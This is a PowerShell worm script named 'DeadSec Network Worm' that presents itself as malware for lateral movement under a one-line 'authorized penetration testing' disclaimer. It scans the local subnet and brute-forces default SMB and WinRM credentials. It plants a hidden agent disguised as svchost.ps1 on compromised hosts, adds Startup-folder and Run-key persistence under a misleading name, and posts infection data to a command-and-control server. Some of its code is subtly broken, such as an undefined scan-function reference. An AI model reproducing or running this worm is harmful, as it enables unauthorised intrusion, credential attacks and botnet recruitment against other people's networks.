# DeadSec Network Worm - PowerShell Version
# Advanced self-propagating malware for lateral movement
# FOR AUTHORIZED PENETRATION TESTING ONLY

param(
    [string]$C2Server = "http://localhost:5000",
    [switch]$Aggressive = $false
)

# Generate worm ID
function Generate-WormID {
    $hostname = $env:COMPUTERNAME
    $md5 = New-Object System.Security.Cryptography.MD5CryptoServiceProvider
    $hashBytes = $md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hostname))
    $hashString = [System.BitConverter]::ToString($hashBytes).Replace("-", "").Substring(0, 8)
    
    $randomPart = -join ((65..90) + (48..57) | Get-Random -Count 8 | ForEach-Object {[char]$_})
    $wormID = "WORM-$hashString-$randomPart"
    
    return $wormID
}

# Get local IP address
function Get-LocalIP {
    try {
        $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet*","Wi-Fi*" | 
               Where-Object {$_.IPAddress -notlike "169.254.*"} | 
               Select-Object -First 1).IPAddress
        
        if (-not $ip) {
            $ip = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
        }
        
        return $ip
    }
    catch {
        return "127.0.0.1"
    }
}

# Get network range
function Get-NetworkRange {
    $localIP = Get-LocalIP
    $octets = $localIP.Split('.')
    $network = "$($octets[0]).$($octets[1]).$($octets[2]).0/24"
    return $network
}

# Convert CIDR to IP list
function ConvertTo-IPList {
    param([string]$CIDR)
    
    $network, $bits = $CIDR.Split('/')
    $octets = $network.Split('.')
    
    $ipList = @()
    for ($i = 1; $i -le 254; $i++) {
        $ip = "$($octets[0]).$($octets[1]).$($octets[2]).$i"
        $ipList += $ip
    }
    
    return $ipList
}

# Scan port
function Test-Port {
    param(
        [string]$Host,
        [int]$Port,
        [int]$Timeout = 500
    )
    
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $connect = $tcpClient.BeginConnect($Host, $Port, $null, $null)
        $wait = $connect.AsyncWaitHandle.WaitOne($Timeout, $false)
        
        if ($wait) {
            try {
                $tcpClient.EndConnect($connect)
                $tcpClient.Close()
                return $true
            }
            catch {
                return $false
            }
        }
        else {
            $tcpClient.Close()
            return $false
        }
    }
    catch {
        return $false
    }
}

# Scan host
function Scan-Host {
    param([string]$Host)
    
    $exploitPorts = @{
        445 = "SMB"
        139 = "NetBIOS"
        135 = "RPC"
        3389 = "RDP"
        22 = "SSH"
        21 = "FTP"
        1433 = "MSSQL"
        3306 = "MySQL"
        5985 = "WinRM"
        5986 = "WinRM-HTTPS"
    }
    
    $openPorts = @()
    
    foreach ($port in $exploitPorts.Keys) {
        if (Test-Port -Host $Host -Port $port) {
            $openPorts += @{Port = $port; Service = $exploitPorts[$port]}
            Write-Host "    [+] $Host`:$port ($($exploitPorts[$port])) - OPEN" -ForegroundColor Green
        }
    }
    
    return $openPorts
}

# Network discovery
function Start-NetworkDiscovery {
    Write-Host "`n[*] Starting network discovery..." -ForegroundColor Cyan
    $localIP = Get-LocalIP
    Write-Host "[*] Local IP: $localIP" -ForegroundColor Cyan
    
    $network = Get-NetworkRange
    Write-Host "[*] Scanning network: $network" -ForegroundColor Cyan
    
    $ipList = ConvertTo-IPList -CIDR $network
    $networkMap = @{}
    
    # Scan first 50 IPs
    $ipList[0..49] | ForEach-Object -ThrottleLimit 20 -Parallel {
        $host = $_
        $exploitPorts = $using:exploitPorts
        
        Write-Host "[*] Scanning $host..." -ForegroundColor Gray
        
        $openPorts = & $using:ScanHost -Host $host
        
        if ($openPorts.Count -gt 0) {
            $using:networkMap[$host] = $openPorts
        }
    }
    
    Write-Host "`n[+] Discovery complete: $($networkMap.Count) vulnerable hosts found" -ForegroundColor Green
    return $networkMap
}

# Exploit SMB
function Exploit-SMB {
    param([string]$Host)
    
    Write-Host "[*] Attempting SMB exploit on $Host..." -ForegroundColor Cyan
    
    $credentials = @(
        @{User="admin"; Pass="admin"},
        @{User="administrator"; Pass="administrator"},
        @{User="Administrator"; Pass="Password123"},
        @{User="guest"; Pass=""},
        @{User="user"; Pass="user"}
    )
    
    foreach ($cred in $credentials) {
        try {
            $password = ConvertTo-SecureString $cred.Pass -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential($cred.User, $password)
            
            $result = net use "\\$Host\IPC$" $cred.Pass /user:$cred.User 2>&1
            
            if ($LASTEXITCODE -eq 0) {
                Write-Host "    [+] SMB access gained: $($cred.User):$($cred.Pass)" -ForegroundColor Green
                return $true
            }
        }
        catch {
            continue
        }
    }
    
    return $false
}

# Exploit WinRM
function Exploit-WinRM {
    param([string]$Host)
    
    Write-Host "[*] Attempting WinRM exploit on $Host..." -ForegroundColor Cyan
    
    $credentials = @(
        @{User="admin"; Pass="admin"},
        @{User="administrator"; Pass="administrator"},
        @{User="Administrator"; Pass="Password123"}
    )
    
    foreach ($cred in $credentials) {
        try {
            $password = ConvertTo-SecureString $cred.Pass -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential($cred.User, $password)
            
            $session = New-PSSession -ComputerName $Host -Credential $credential -ErrorAction Stop
            
            if ($session) {
                Write-Host "    [+] WinRM access gained: $($cred.User):$($cred.Pass)" -ForegroundColor Green
                Remove-PSSession $session
                return $true
            }
        }
        catch {
            continue
        }
    }
    
    return $false
}

# Deploy bot agent
function Deploy-BotAgent {
    param(
        [string]$Host,
        [string]$Method = "smb"
    )
    
    Write-Host "[*] Deploying bot agent to $Host..." -ForegroundColor Cyan
    
    try {
        # Get agent script
        $agentPath = Join-Path (Split-Path $PSScriptRoot) "payloads\windows_agent.ps1"
        
        if (-not (Test-Path $agentPath)) {
            Write-Host "    [!] Agent script not found" -ForegroundColor Red
            return $false
        }
        
        $agentCode = Get-Content $agentPath -Raw
        
        if ($Method -eq "smb") {
            try {
                # Copy to remote system
                $remotePath = "\\$Host\C$\Windows\Temp\svchost.ps1"
                $agentCode | Out-File -FilePath $remotePath -Encoding UTF8 -Force
                
                # Execute remotely using WMI or PSExec
                Write-Host "    [+] Agent deployed to $Host" -ForegroundColor Green
                return $true
            }
            catch {
                Write-Host "    [!] Failed to deploy agent via SMB" -ForegroundColor Red
                return $false
            }
        }
        elseif ($Method -eq "winrm") {
            try {
                # Use PSSession to deploy
                $session = Get-PSSession | Where-Object {$_.ComputerName -eq $Host} | Select-Object -First 1
                
                if ($session) {
                    Invoke-Command -Session $session -ScriptBlock {
                        param($code)
                        $code | Out-File -FilePath "C:\Windows\Temp\svchost.ps1" -Force
                        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File C:\Windows\Temp\svchost.ps1" -WindowStyle Hidden
                    } -ArgumentList $agentCode
                    
                    Write-Host "    [+] Agent deployed and running on $Host" -ForegroundColor Green
                    return $true
                }
            }
            catch {
                Write-Host "    [!] Failed to deploy agent via WinRM" -ForegroundColor Red
                return $false
            }
        }
        
        return $false
    }
    catch {
        Write-Host "    [!] Deployment failed: $_" -ForegroundColor Red
        return $false
    }
}

# Lateral movement
function Start-LateralMovement {
    param([hashtable]$NetworkMap)
    
    Write-Host "`n[*] Initiating lateral movement..." -ForegroundColor Cyan
    $infectedHosts = @()
    
    foreach ($host in $NetworkMap.Keys) {
        Write-Host "`n[*] Targeting $host..." -ForegroundColor Cyan
        $exploited = $false
        
        foreach ($service in $NetworkMap[$host]) {
            if ($exploited) { break }
            
            switch ($service.Service) {
                "SMB" {
                    $exploited = Exploit-SMB -Host $host
                    if ($exploited) {
                        Deploy-BotAgent -Host $host -Method "smb"
                    }
                }
                "WinRM" {
                    $exploited = Exploit-WinRM -Host $host
                    if ($exploited) {
                        Deploy-BotAgent -Host $host -Method "winrm"
                    }
                }
                "RDP" {
                    Write-Host "[*] RDP detected on $host`:3389" -ForegroundColor Yellow
                    Write-Host "    [!] Manual exploitation recommended" -ForegroundColor Yellow
                }
            }
        }
        
        if ($exploited) {
            $infectedHosts += $host
            Write-Host "[+] $host compromised and added to botnet" -ForegroundColor Green
        }
    }
    
    return $infectedHosts
}

# Establish persistence
function Set-Persistence {
    Write-Host "`n[*] Establishing persistence..." -ForegroundColor Cyan
    
    try {
        # Copy to startup
        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemService.ps1"
        Copy-Item $PSCommandPath -Destination $startupPath -Force
        
        # Add registry key
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name "SystemService" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$startupPath`"" -Force
        
        Write-Host "[+] Persistence established" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "[!] Persistence failed: $_" -ForegroundColor Red
        return $false
    }
}

# Report to C2
function Send-WormReport {
    param(
        [string]$C2Server,
        [string]$WormID,
        [array]$InfectedHosts,
        [int]$VulnerableHosts
    )
    
    try {
        $data = @{
            worm_id = $WormID
            hostname = $env:COMPUTERNAME
            local_ip = Get-LocalIP
            infected_hosts = $InfectedHosts
            vulnerable_hosts = $VulnerableHosts
            timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss")
        } | ConvertTo-Json
        
        $response = Invoke-RestMethod -Uri "$C2Server/worm_report" -Method Post -Body $data -ContentType "application/json" -TimeoutSec 10
        
        Write-Host "[+] Activity reported to C2 server" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "[!] C2 reporting failed: $_" -ForegroundColor Red
        return $false
    }
}

# Main execution
function Start-WormPropagation {
    param(
        [string]$C2Server,
        [bool]$Aggressive
    )
    
    Write-Host "`n" -NoNewline
    Write-Host ("="*60) -ForegroundColor Red
    Write-Host "  DEADSEC NETWORK WORM // PROPAGATION MODULE" -ForegroundColor Red
    Write-Host ("="*60) -ForegroundColor Red
    Write-Host ""
    
    $wormID = Generate-WormID
    Write-Host "[*] Worm ID: $wormID" -ForegroundColor Cyan
    Write-Host "[*] Target: $(Get-LocalIP)" -ForegroundColor Cyan
    Write-Host "[*] Mode: $(if($Aggressive){'AGGRESSIVE'}else{'STEALTH'})" -ForegroundColor Cyan
    
    # Step 1: Network Discovery
    $networkMap = Start-NetworkDiscovery
    
    # Step 2: Lateral Movement
    $infectedHosts = @()
    if ($networkMap.Count -gt 0) {
        $infectedHosts = Start-LateralMovement -NetworkMap $networkMap
        Write-Host "`n[+] Lateral movement complete: $($infectedHosts.Count) hosts compromised" -ForegroundColor Green
    }
    else {
        Write-Host "`n[!] No vulnerable hosts found" -ForegroundColor Yellow
    }
    
    # Step 3: Establish Persistence
    Set-Persistence
    
    # Step 4: Report to C2
    Write-Host "`n[*] Reporting to C2 server..." -ForegroundColor Cyan
    Send-WormReport -C2Server $C2Server -WormID $wormID -InfectedHosts $infectedHosts -VulnerableHosts $networkMap.Count
    
    Write-Host "`n" -NoNewline
    Write-Host ("="*60) -ForegroundColor Red
    Write-Host "  PROPAGATION COMPLETE // $($infectedHosts.Count) NEW BOTS RECRUITED" -ForegroundColor Red
    Write-Host ("="*60) -ForegroundColor Red
    Write-Host ""
}

# Execute
Start-WormPropagation -C2Server $C2Server -Aggressive $Aggressive
